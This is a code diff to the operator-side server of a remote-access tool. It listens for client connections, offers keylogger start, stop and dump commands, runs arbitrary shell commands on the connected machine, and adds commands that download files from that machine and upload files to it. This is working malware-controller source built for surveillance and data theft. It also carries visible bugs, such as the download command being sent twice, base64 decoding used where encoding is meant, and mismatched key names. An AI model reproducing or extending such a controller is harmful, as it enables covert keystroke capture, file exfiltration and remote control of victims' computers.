@@ -1,11 +1,18 @@
-from datetime import datetime
+
 import os
 import socket
 import sys
+import shlex
+import base64
+
+
+from pathlib import Path
+from datetime import datetime
 
 HOST = '0.0.0.0'
 PORT = 4433
 KEYLOGGER_PATH = 'Keylog_dumps'
+DOWLOAD_PATH = 'downloads'
 
 
 def print_banner():
@@ -35,6 +42,10 @@ KEYLOGGER:
   /keylog stop                 - Stop keylloger
   /keylog dump                 - Dump captured keys
 
+FILE TRANSFER:
+  /dowload '<remote_path>'     - Download file
+  /upload '<local_file>' '<remote_path>' - Upload file
+
 SYSTEM:
   cd <path>                    - Change directory
   /exit                        - Disconnect client
@@ -46,6 +57,49 @@ SHELL COMMANDS:
     Anny other command will be executed as shell command
 """)
 
+
+def save_dowloaded_file(data, original_filename):
+    try:
+        if not os.path.exists(DOWLOAD_PATH):
+            os.makedirs(DOWLOAD_PATH)
+        
+        file_data = base64.b64decode(data.strip())
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        name, ext = os.path.splitext(original_filename)
+        filename = f'{name}_{timestamp}{ext}'
+        
+        filepath = os.path.join(DOWLOAD_PATH, filename)
+        
+        with open(filepath, 'wb') as f:
+            f.write(file_data)
+        
+        print(f'\n[+] File dowloaded: {filepath}')
+        print(f'[i] Size: {len(file_data)} Bytes')
+        return True
+    
+    except Exception as e:
+        print(f'\n[-] Error saving file: {e}')
+        return False
+
+
+def read_file_to_upload(filepath):
+    try:
+        if not os.path.exists(filepath):
+            print(f'[-] File not found: {filepath}')
+            return None
+        
+        with open(filepath, 'rb') as f:
+            file_data = f.read()
+        
+        return{
+            'data': base64.b64decode(file_data).decode('utf-8'),
+            'Size': len(file_data),
+            'Filename': Path(filepath).name
+        }
+    
+    except Exception as e:
+        print(f'[-] Error reading file: {e}')
+        return None
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -99,6 +153,96 @@ def handle_client(conn,addr):
                     print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                     continue
                 
+                elif command.startswith('/dowload '):
+                    try:
+                        parts = shlex.split(command)
+                        if len(parts) < 2:
+                            print(f'[-] Usage: /dowload \'<remote_path\'')
+                            continue
+                    
+                        remote_path = parts[1]
+                        
+                        conn.send(f'/download {remote_path}\n'.encode())
+                    
+                    except ValueError:
+                        print(f'[-] Invalid command syntax: {e}')
+                        continue
+                    
+                    conn.send(command.encode() + b'\n')
+                    
+                    buffer = b''
+                    in_file = False
+                    filename = None
+                    
+                    conn.settimeout(10)
+                    
+                    while True:
+                        chunck = conn.recv(4069)
+                        if not chunck:
+                            break
+                        
+                        buffer += chunck
+                        
+                        if b'[FILE_START]' in buffer and not in_file:
+                            in_file = True
+                            parts = buffer.split(b'[FILE_START]')
+                            header = parts[0].decode('utf-8', errors='ignore')
+                            print (header)
+                            
+                            for line in header.split('\n'):
+                                if 'filename:' in line:
+                                    filename = line.split('filename:')[1].strip()
+                            
+                            buffer = parts[1]
+                            
+                        if b'[FILE_END]' in buffer:
+                            file_data = buffer.split(b'[FILE_END]')[0]
+                            
+                            if filename:
+                                save_dowloaded_file(file_data.decode('utf-8'), filename)
+                            else:
+                                print('[-] Could not determine filename')
+                                break
+                    
+                    continue
+                
+                elif command.startswith('/upload'):
+                    try:
+                        parts = shlex.split(command)
+                        
+                        if len(parts) < 3:
+                            print('[-] Usage: /upload \'<local_file\'\'<remote_path>\'')
+                            continue
+                        
+                        local_file = parts[1]
+                        remote_path = parts[2]
+                        
+                        file_info = read_file_to_upload(local_file)
+                        
+                        if not file_info:
+                            continue
+                        
+                        print(f'[+] Uploading {file_info['filename']}({file_info['size']} bytes)...')
+                        
+                        conn.send(f'/upload {remote_path}\n'.encode())
+                        
+                    except ValueError as e:
+                        print(f'[-] Invalid command syntax: {e}')
+                        continue
+                    
+                    response = conn.recv(1024).decode('utf-8', errors='ignore')
+                    print(response, end='')
+                    
+                    if 'Ready to receive' in response:
+                        conn.send(file_info['data'].encode())
+                        conn.send(b'[UPLOAD_END]\n')
+                        
+                        conn.settimeout(5)
+                        result = conn.recv(4096).decode('utf-8', errors='ignore')
+                        print(result, end='')
+                        
+                    continue
+                    
                 conn.send(command.encode() + b'\n')
                 
                 if command == '/exit':
